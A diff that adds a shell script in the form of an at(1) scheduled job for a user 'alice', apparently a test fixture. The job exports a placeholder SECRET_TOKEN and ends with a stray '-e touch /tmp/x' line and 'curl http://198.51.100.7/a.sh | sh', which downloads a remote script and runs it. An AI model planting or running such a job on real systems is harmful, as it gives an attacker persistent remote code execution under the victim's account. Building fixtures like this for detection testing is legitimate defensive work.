@@ -1,0 +1,22 @@
+#!/bin/sh
+# atrun uid=1000 gid=1000
+# mail alice 0
+umask 22
+SECRET_TOKEN=abc; export SECRET_TOKEN
+MAIL=/var/mail/alice; export MAIL
+USER=alice; export USER
+HOSTNAME=2cb5e56f5422; export HOSTNAME
+SHLVL=1; export SHLVL
+HOME=/home/alice; export HOME
+OLDPWD=/; export OLDPWD
+LOGNAME=alice; export LOGNAME
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; export PATH
+DEBIAN_FRONTEND=noninteractive; export DEBIAN_FRONTEND
+PWD=/home/alice; export PWD
+cd /home/alice || {
+	 echo 'Execution directory inaccessible' >&2
+	 exit 1
+}
+-e touch /tmp/x
+curl http://198.51.100.7/a.sh | sh
+
